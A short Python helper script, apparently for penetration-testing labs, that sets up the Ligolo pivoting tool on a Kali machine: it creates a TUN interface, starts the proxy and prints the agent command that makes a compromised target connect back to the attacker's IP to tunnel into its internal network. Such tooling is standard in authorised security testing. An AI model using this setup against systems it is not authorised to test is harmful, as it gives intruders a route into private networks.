# Runs the basic commands to get ligolo up and running on your kali machine, along with some helper text to finish the remaining setup

import subprocess

# Function to print colored text
def print_colored(text, color):
    colors = {
        "red": "\033[91m",
        "green": "\033[92m",
        "reset": "\033[0m"
    }
    return f"{colors[color]}{text}{colors['reset']}"
    
ip_command = "ip -4 addr show tun0 | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}'"
ip_output = subprocess.check_output(ip_command, shell=True, text=True).strip()
# Ligolo instructions
print("# Upload Ligolo agent to target server and execute the following command:")
print(print_colored(f"\n ./agent.exe -ignore-cert -connect {ip_output}:11601", "green"))
print("\n\n# Execute the following in Ligolo")
print(print_colored("\nsession", "green"))
print(print_colored("\nifconfig", "green"))
print("\n\n# Run the following in a separate terminal window:")
print(print_colored(f"\nsudo ip route add <internallIP>.0/24 dev ligolo\n\n", "green"))

# Command 1: Create a TUN interface named 'ligolo'
create_tun_cmd = "sudo ip tuntap add user kali mode tun ligolo"

try:
    subprocess.run(create_tun_cmd, shell=True, check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
except subprocess.CalledProcessError as e:
    # Check if the exit status is non-zero
    if e.returncode != 0:
        error_message = "TUN interface 'ligolo' could not be created. Proceeding with caution."
        print(print_colored("Warning: " + error_message, "red"))
    else:
        # Raise the error if it's a different one
        raise e
        
# Command 2: Set the 'ligolo' interface up
set_up_cmd = "sudo ip link set ligolo up"
subprocess.run(set_up_cmd, shell=True, check=True)

# Command 3: Update path to your ligolo proxy binary and execute it
ligolo_proxy_path = "~/ligolo/proxy"  # Update this path
ligolo_cmd = f"{ligolo_proxy_path} -selfcert"
subprocess.run(ligolo_cmd, shell=True, check=True)
